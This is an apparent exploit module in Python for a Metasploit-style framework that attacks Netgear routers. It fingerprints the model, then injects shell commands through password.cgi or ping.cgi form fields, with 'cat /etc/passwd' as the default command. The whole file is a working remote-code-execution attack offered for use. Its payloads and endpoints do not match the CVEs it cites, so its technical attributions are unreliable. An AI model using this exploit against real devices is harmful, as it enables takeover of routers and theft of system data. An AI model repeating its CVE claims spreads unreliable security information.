#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Netgear Multiple Routers Remote Code Execution
CVE-2016-6277, CVE-2017-5521
"""

import requests
import urllib.parse

MODULE_INFO = {
    "name": "Netgear Multiple Routers RCE",
    "description": "Remote Code Execution in multiple Netgear router models via password recovery vulnerability",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "rank": "Great",
    "references": [
        "CVE-2016-6277",
        "CVE-2017-5521",
        "https://www.exploit-db.com/exploits/40889"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.1.1"
    },
    "RPORT": {
        "description": "Target router port",
        "required": False,
        "default": "80"
    },
    "CMD": {
        "description": "Command to execute",
        "required": True,
        "default": "cat /etc/passwd"
    },
    "MODEL": {
        "description": "Router model (auto, r7000, r6400, r8000, etc)",
        "required": False,
        "default": "auto"
    }
}

class NetgearRCE:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}"
        
    def detect_model(self):
        """Automatically detect Netgear router model"""
        try:
            models = {
                "R7000": {"path": "/", "header": "NETGEAR R7000"},
                "R6400": {"path": "/", "header": "NETGEAR R6400"},
                "R8000": {"path": "/", "header": "NETGEAR R8000"},
                "R6250": {"path": "/", "header": "NETGEAR R6250"},
                "R6300v2": {"path": "/", "header": "NETGEAR R6300"}
            }
            
            for model, info in models.items():
                url = self.base_url + info["path"]
                response = requests.get(url, timeout=5, verify=False)
                if info["header"] in response.text:
                    return model
                    
            return "unknown"
            
        except:
            return "unknown"
    
    def execute_command_r7000(self, command):
        """RCE for R7000 and similar models"""
        try:
            # Password recovery RCE
            payload = f"';{command};echo '"
            
            exploit_data = {
                "sysNewPass": payload,
                "sysConfirmPass": payload,
                "sysOldPass": "",
                "todo": "sys_passwd"
            }
            
            exploit_url = f"{self.base_url}/password.cgi"
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            response = requests.post(exploit_url, data=exploit_data, headers=headers, timeout=10, verify=False)
            return response.text
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def execute_command_older(self, command):
        """RCE for older Netgear models"""
        try:
            # Different endpoint for older models
            payload = f"127.0.0.1; {command}"
            
            exploit_data = {
                "ping_address": payload,
                "ping_size": "64",
                "ping_times": "5",
                "action": "Ping"
            }
            
            exploit_url = f"{self.base_url}/ping.cgi"
            response = requests.post(exploit_url, data=exploit_data, timeout=10, verify=False)
            return response.text
            
        except Exception as e:
            return f"Error: {str(e)}"

def display_exploit_info():
    """Display exploit information"""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    
    table = Table(show_header=True, header_style="bold red", box=None)
    table.add_column("Module", style="bold yellow")
    table.add_column("Details", style="white")
    
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("Module", "exploit/linux/router/netgear_rce")
    table.add_row("Disclosure", "2016-2017")
    table.add_row("Platform", MODULE_INFO["platform"])
    table.add_row("Rank", MODULE_INFO["rank"])
    
    console.print(Panel(table, title="Exploit Information", border_style="red"))
    
    # Affected devices
    affected_panel = Panel(
        "Netgear R7000\n"
        "Netgear R6400\n" 
        "Netgear R8000\n"
        "Netgear R6250\n"
        "Netgear R6300v2\n"
        "Netgear WNR1000v3\n"
        "Netgear WNR2000v3\n"
        "Netgear WNR2200\n"
        "Netgear WNR2500\n"
        "Netgear WNDR3700v4\n"
        "Netgear WNDR4000\n"
        "Netgear WNDR4300\n"
        "Netgear WNDR4500",
        title="Affected Devices",
        border_style="yellow"
    )
    console.print(affected_panel)

def run(session, options):
    """Main exploit function"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.table import Table
    
    console = Console()
    
    # Display exploit info
    display_exploit_info()
    
    # Display options
    current_options = OPTIONS.copy()
    for key in current_options:
        if key in options:
            current_options[key]['value'] = options[key]
    
    table = Table(show_header=True, header_style="bold magenta", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Current Setting", style="green")
    table.add_column("Required", style="yellow")
    table.add_column("Description", style="white")
    
    for name, config in current_options.items():
        current = config.get('value', config.get('default', ''))
        required = "yes" if config.get('required', False) else "no"
        description = config.get('description', '')
        
        table.add_row(name, str(current), required, description)
    
    console.print(Panel(table, title="Module Options (exploit/linux/router/netgear_rce)", border_style="blue"))
    
    # Get options
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    cmd = options.get("CMD", "cat /etc/passwd")
    model = options.get("MODEL", "auto")
    
    console.print(f"\n[bold yellow][*][/bold yellow] Target: [cyan]{rhost}:{rport}[/cyan]")
    console.print(f"[bold yellow][*][/bold yellow] Command: [red]{cmd}[/red]")
    
    try:
        # Initialize exploit
        exploit = NetgearRCE(rhost, rport)
        
        # Detect model if auto
        if model == "auto":
            console.print("\n[bold yellow][*][/bold yellow] Detecting router model...")
            detected_model = exploit.detect_model()
            console.print(f"[bold green][+][/bold green] Detected model: [cyan]{detected_model}[/cyan]")
            model = detected_model
        else:
            console.print(f"\n[bold yellow][*][/bold yellow] Using specified model: [cyan]{model}[/cyan]")
        
        console.print("[bold yellow][*][/bold yellow] Executing command via RCE...")
        
        # Choose exploit based on model
        if model in ["R7000", "R6400", "R8000", "R6250"]:
            result = exploit.execute_command_r7000(cmd)
        else:
            result = exploit.execute_command_older(cmd)
        
        if result and "Error" not in result:
            console.print("[bold green][+][/bold green] Command executed successfully!")
            
            # Display result
            syntax = Syntax(result, "text", theme="monokai", line_numbers=True)
            console.print(Panel(syntax, title="Command Output", border_style="green"))
            
        else:
            console.print("[red][-][/red] Command execution failed")
            if result:
                console.print(f"[red]Error: {result}[/red]")
                
    except Exception as e:
        console.print(f"[red][-][/red] Exploit failed: {str(e)}")
